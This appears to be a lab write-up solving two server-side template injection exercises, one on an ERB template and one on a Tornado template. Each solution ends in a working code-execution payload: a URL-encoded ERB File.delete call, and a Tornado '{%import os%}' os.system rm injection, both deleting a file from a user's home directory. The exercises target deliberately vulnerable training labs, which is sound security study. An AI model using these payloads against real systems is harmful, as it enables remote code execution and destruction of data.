# Lab 1

## Description

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Solution

When a product is out of stock, a GET request is triggered to render the out of stock message:

```
Unfortunately this product is out of stocktest
```

The description hints on ERB documentation. This means SSTI happens inside `<%%>`. Using this knowledge:

```
GET /?message=<%=+7*7+%>
```

returns:

```
[...]
<div>49
</div>
[...]
```

which confirms SSTI. 

To solve the lab we need to delete the following file:

```
/home/carlos/morale.txt
```

In payload:

```
GET /?message=%3c%25%3d%20File.delete(%22%2fhome%2fcarlos%2fmorale.txt%22)%20%25%3e%20
```

solves the lab.


# Lab 2

## Description

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Login as user `wiener` and navigate to account preferences. There notice the preferred display name can be changed. Selecting any option and clicking `Submit` send the following request to the server:

```
POST /my-account/change-blog-post-author-display HTTP/2
[...]

blog-post-author-display=user.first_name&csrf=YHsk1Wrd8TbC4mOSBt6rugmyP0TNJArE
```

confirm the parameter:

```
blog-post-author-display
```

is vulnerable to SSTI with:

```
POST /my-account/change-blog-post-author-display HTTP/2
[...]

blog-post-author-display=user.first_name}}{{7*7&csrf=YHsk1Wrd8TbC4mOSBt6rugmyP0TNJArE
```

send the request and comment any post. Observe `49` is rendered in username display name. 

Following Tornado documentation, the syntax to execute code is as follows:

```
}}{%import+os%}{{os.system('rm%2b/home/carlos/morale.txt')
```

**Note:** URL encoding space to `+` doesn't work but double encoding as `%2b` works here despite getting a 500 error message:

```
sh: 1: rm+/home/carlos/morale.txt: not found
```

the lab is still listed as solved. A more stable space encoding method would be to use:

```
%20
```


